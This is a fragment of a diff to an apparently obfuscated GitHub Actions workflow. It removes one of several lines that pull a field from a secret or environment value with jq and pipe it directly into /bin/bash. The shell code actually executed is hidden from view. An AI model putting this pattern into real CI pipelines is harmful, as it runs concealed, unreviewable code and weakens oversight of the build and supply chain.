@@ -22,7 +22,6 @@ jobs:
           u831: ${{ secrets.u831 }}
         run: |
           printf '%s' "$u831" | jq -r .red97739 | /bin/bash
-          echo $wll78 | jq -r .boz14009 | /bin/bash
           printf '%s' "$he869" | jq -r .favke60186 | /bin/bash
           printf '%s' "$j76572" | jq -r .o53 | /bin/bash
 
